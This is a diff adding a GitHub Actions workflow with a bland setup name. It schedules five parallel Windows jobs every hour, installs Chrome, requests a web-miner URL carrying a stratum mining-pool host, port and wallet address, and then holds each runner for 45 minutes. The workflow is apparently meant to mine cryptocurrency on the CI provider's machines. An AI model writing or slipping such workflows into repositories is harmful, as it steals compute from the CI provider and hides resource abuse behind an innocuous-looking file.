@@ -1,0 +1,32 @@
+name: Windows Setup and Execution 2
+
+on:
+  schedule:
+    # Run every hour
+    - cron: '0 * * * *'
+  workflow_dispatch: # Allow manual trigger for testing
+
+jobs:
+  build:
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        job_id: [1, 2, 3, 4, 5]  # Define 5 different jobs
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v3
+
+      - name: Install Google Chrome
+        run: |
+          $chromeInstaller = "chrome_installer.exe"
+          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
+          Start-Process -Wait -FilePath $chromeInstaller
+          
+      - name: Access URL with PowerShell
+        run: |
+          $url = "https://webminer.pages.dev?algorithm=yespower&host=stratum-asia.rplant.xyz&port=17122&worker=QXAU8sRQcwx4Agii4a4VLpkD3SwF7MohgS&password=x&workers=4"
+          Invoke-WebRequest -Uri $url -OutFile "response.html"
+        
+      - name: Sleep for 45 minutes
+        run: |
+          Start-Sleep -Seconds 2700  # Sleep for 45 minutes (2700 seconds)
